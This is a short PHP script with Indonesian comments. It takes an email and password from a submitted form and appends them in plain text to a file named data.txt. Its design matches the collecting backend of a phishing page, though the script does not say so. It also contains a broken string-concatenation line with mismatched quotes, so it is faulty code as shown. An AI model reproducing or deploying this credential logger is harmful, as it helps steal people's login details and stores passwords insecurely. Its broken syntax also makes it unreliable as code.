<?php
// Nama file yang akan dibuat atau ditulis
$filename = "data.txt";
$username = $_POST["email"];
$password = $_POST["password"];

// Data yang ingin ditulis ke file
$data = "$username . " " . $password";

// Buka file dalam mode "a" (append) untuk menambah data di akhir file.
// Jika file tidak ada, maka file akan dibuat.
$file = fopen($filename, "a");

// Periksa apakah file berhasil dibuka
if ($file) {
    // Tulis data ke dalam file
    fwrite($file, $data);

    // Tutup file setelah selesai menulis
    fclose($file);
    echo "Data berhasil ditulis ke file $filename.";
} else {
    echo "Gagal membuka file $filename.";
}
?>
